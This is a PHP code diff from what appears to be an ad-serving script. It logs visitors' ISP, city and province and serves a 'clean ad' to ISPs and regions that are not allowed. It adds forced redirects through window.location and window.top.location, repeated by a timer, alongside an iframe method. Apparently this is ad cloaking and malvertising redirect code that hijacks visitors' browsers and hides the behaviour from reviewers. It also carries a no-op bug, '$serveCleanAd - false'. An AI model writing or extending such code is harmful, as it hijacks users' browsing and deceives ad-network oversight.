@@ -499,7 +499,7 @@
 	    return $result;
 	}
 
-	function appendReferrerParameter($url)
+	function appendParameterPrefix($url)
 	{
 		if (strpos($url, "?") === false)
 		{
@@ -510,6 +510,12 @@
 			$url .= "&";
 		}
 
+		return $url;
+	}
+
+	function appendReferrerParameter($url)
+	{
+		$url = appendParameterPrefix($url);
 		$url .= "referrer=";
 
 		return $url;
@@ -568,7 +574,7 @@
 
 	function appendAutoRotateSourceParameter($url, $sourceWeightList)
 	{
-		return $url . "&" . generateAutoRotateSourceParameter($sourceWeightList);
+		return appendParameterPrefix($url) . generateAutoRotateSourceParameter($sourceWeightList);
 	}
 
 	function mylog($txt) {
@@ -683,13 +689,13 @@
 		{
 			$serveCleanAd - false;
 
-			adlog("ISP/Geo is allowed. ISP: " . $isp['isp']);
+			adlog("ISP/Geo is allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
 		}
 		else
 		{
 			$serveCleanAd = true;
 
-			adlog("ISP/Geo is NOT allowed. ISP: " . $isp['isp']);
+			adlog("ISP/Geo is NOT allowed. ISP: " . $isp['isp'] . " / City: " . $geo['city'] . " / Province: " . $geo['province']);
 		}
 	}
 
@@ -707,11 +713,11 @@
 			$sourceWeightList = $sourceWeightListPerCountry[$adCountry];
 		}
 
-		// Append referrer
-		$redirectUrl = appendReferrerParameter($redirectUrl);
-
 		// Append auto generated source parameter
 		$redirectUrl = appendAutoRotateSourceParameter($redirectUrl, $sourceWeightList);
+
+		// Append referrer
+		$redirectUrl = appendReferrerParameter($redirectUrl);
 
 		adlog($redirectUrl);
 
@@ -734,11 +740,15 @@
 		}
 		if ($redirectMethod == "windowlocation")
 		{
-			$redirectCode = "window.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
+			$windowLocationCode = "window.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
+			$redirectCode = "$windowLocationCode
+							 setTimeout(function() { $windowLocationCode }, 200);";
 		}
 		else if ($redirectMethod == "windowtoplocation")
 		{
-			$redirectCode = "window.top.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
+			$windowTopLocationCode = "window.top.location = '$redirectUrl' + encodeURIComponent(topDomain) + '&' + location.search.substring(1);";
+			$redirectCode = "$windowTopLocationCode
+							 setTimeout(function() { $windowTopLocationCode }, 200);";
 		}
 		else if ($redirectMethod == "1x1iframe")
 		{
